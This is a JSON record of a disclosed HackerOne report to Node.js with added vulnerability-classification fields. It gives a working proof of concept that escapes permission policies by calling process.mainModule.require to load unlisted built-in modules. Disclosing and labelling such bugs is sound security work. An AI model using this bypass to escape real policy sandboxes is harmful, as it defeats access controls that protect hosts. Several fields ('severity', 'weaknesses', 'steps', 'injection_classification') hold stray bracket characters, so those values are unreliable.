{
  "reported_to": "Node.js",
  "reported_by": "goums ",
  "title": "Permissions policies can be bypassed via process.mainModule",
  "content": "\nSummary:\nPermissions policies module can be bypassed via process.mainModule.require\nDescription:\nPermission policies allow to run a script with a specific set of authorized node js built-in modules.\nHowever, the script could access non authorized modules by calling process.mainModule.require()\nSteps To Reproduce:\nCreate escape.js file:\nCode 53 Bytes\n1console.log(process.mainModule.require(\"os\").cpus());\nCreate policy.json file:\nCode 113 Bytes\n1{\n2  \"onerror\": \"exit\",\n3  \"scopes\": {\n4    \"file:\": {\n5      \"integrity\": true,\n6      \"dependencies\": {}\n7    }\n8  }\n9}\nRun:\nCode 48 Bytes\n1node --experimental-policy=policy.json escape.js\nYou will see your os cpus listed in the console even though the escape.js file does not have the permission to import the nodeos module\nImpact:\nPermission policies are supposed to enforce imported modules to a limited whitelist.\nThis vulnerability allow a script to include any non-whitelisted module.\nIf you modify escape.js to use top level require statement, like this:\nCode 49 Bytes\n1const os = require(\"os\");\n2console.log(os.cpus());\nand run again:\nCode 48 Bytes\n1node --experimental-policy=policy.json escape.js\nyou'll now see this error:\nCode 154 Bytes\n1Error [ERR_MANIFEST_DEPENDENCY_MISSING]: Manifest resource escape.js does not list os as a dependency specifier for conditions: require, node, node-addons\nwhich is the expected behavior and should be enforced as well when using process.mainModule.require\nImpact\nAny project that uses permission policies for arbitrary code execution are vulnerable to sandbox escaping.\nThis example show a non-critical permission gain (listing the machine cpu), but an attacker could do much more damage by accessing internal file system, running child processes, ...\n\n",
  "severity": "[",
  "bounty": null,
  "weaknesses": "[",
  "screenshots": {},
  "disclosed_date": 1679260320,
  "report_url": "https://hackerone.com/reports/1747642",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": "[",
  "Create escape.js file with the following content": "console.log(process.mainModule.require(\\\"os\\\").cpus());",
  "Create policy.json file with the following content": "{\\\"onerror\\\": \\\"exit\\\", \\\"scopes\\\": {\\\"file:\\\": {\\\"integrity\\\": true, \\\"dependencies\\\": {}}}}",
  "Run the script with the policy": "node --experimental-policy=policy.json escape.js",
  "vuln_description": "The vulnerability allows bypassing Node.js permission policies by using process.mainModule.require() to access unauthorized modules, despite the policy restrictions. This bypasses the intended module whitelist enforcement.",
  "reason": "The vulnerability involves understanding Node.js permission policies and the subtle interaction between process.mainModule.require() and the policy enforcement mechanism. While the components are straightforward, the interaction is non-obvious and requires knowledge of Node.js internals.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "injection_classification": "}"
}